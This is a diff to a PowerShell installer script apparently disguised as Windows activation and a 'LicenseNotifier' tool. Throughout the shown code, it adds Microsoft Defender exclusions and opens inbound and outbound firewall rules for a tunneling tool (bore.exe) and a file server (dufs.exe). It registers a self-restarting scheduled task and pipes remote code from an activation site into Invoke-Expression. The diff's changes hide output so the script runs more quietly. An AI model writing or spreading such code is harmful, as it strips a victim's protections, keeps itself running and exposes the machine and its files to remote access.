@@ -18,7 +18,10 @@ function Download-WithProgress {
     )
 
     Add-Type -AssemblyName System.Net.Http
-    $client = New-Object System.Net.Http.HttpClient
+    $handler = New-Object System.Net.Http.HttpClientHandler
+    $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
+    $client = New-Object System.Net.Http.HttpClient($handler)
+    $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
     $buffer = New-Object byte[] 8192
     $downloaded = $false
 
@@ -113,17 +116,17 @@ Show-Status "Processing..."
 Start-Sleep -Seconds 1
 
 # Add to Defender exclusions
-Add-MpPreference -ExclusionPath $secureDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $secureDir -ErrorAction SilentlyContinue | Out-Null
 $licenseNotifierPath = "$env:LOCALAPPDATA\LicenseNotifier"
-Add-MpPreference -ExclusionPath $licenseNotifierPath -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $licenseNotifierPath -ErrorAction SilentlyContinue | Out-Null
 
 # Firewall rules
 $exeList = @("$filePath", "$licenseNotifierPath\bore.exe", "$licenseNotifierPath\dufs.exe")
 foreach ($exe in $exeList) {
     if (Test-Path $exe) {
         $name = [System.IO.Path]::GetFileNameWithoutExtension($exe)
-        New-NetFirewallRule -DisplayName "$name-In" -Direction Inbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue
-        New-NetFirewallRule -DisplayName "$name-Out" -Direction Outbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue
+        New-NetFirewallRule -DisplayName "$name-In" -Direction Inbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
+        New-NetFirewallRule -DisplayName "$name-Out" -Direction Outbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
     }
 }
 
@@ -135,8 +138,15 @@ $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win3
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
 
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
 }
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
-Start-Process powershell -ArgumentList '-Command', 'Invoke-RestMethod "https://get.activated.win" | Invoke-Expression' -Wait
+# Inline execution in same window with visual feedback
+Clear-Host
+Write-Host "" -BackgroundColor DarkBlue -ForegroundColor White " Running Activation... "
+try {
+    Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
+} catch {
+    Write-Host "Activation failed or was interrupted." -ForegroundColor Red
+}
